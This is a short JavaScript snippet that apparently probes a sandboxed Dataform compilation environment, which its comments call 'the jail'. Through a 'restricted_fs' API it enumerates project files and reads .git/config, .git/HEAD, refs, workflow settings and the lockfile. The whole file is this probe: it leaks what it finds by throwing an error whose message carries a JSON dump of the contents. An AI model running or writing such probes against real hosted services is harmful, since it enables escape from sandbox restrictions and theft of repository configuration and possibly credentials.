var out = {};
function S(x,n){ try { return String(x).slice(0,n||300); } catch(e){ return "?"; } }
// list what IS in the jail (the live checkout view) - walk directories
function walk(p, depth){
  if (depth > 2) return [];
  var res = [];
  ["package.json","package-lock.json","workflow_settings.yaml",".npmrc","definitions","node_modules",
   ".git","dataform.json","definitions/exec.js","node_modules/@dataform/core","node_modules/@dataform/core/package.json",
   "node_modules/@dataform/core/index.js","node_modules/@dataform/core/main.js",".git/HEAD",".git/config"].forEach(function(f){
    var q = p.replace(/\/$/,"") + "/" + f;
    try { if (restricted_fs.exists(q)) { res.push(q.replace("//","/") + (restricted_fs.isDirectory(q)?"/":"(f)")); } } catch(e){}
  });
  return res;
}
out.root = walk("/", 0);
// the git repo is in the jail - read .git/config and HEAD if present
[".git/HEAD",".git/config",".git/refs/heads/main","workflow_settings.yaml","package-lock.json"].forEach(function(f){
  try { if (restricted_fs.exists("/"+f)) out["f_"+f] = S(restricted_fs.readFile("/"+f), 200); } catch(e){}
});
throw new Error("JX::" + JSON.stringify(out));
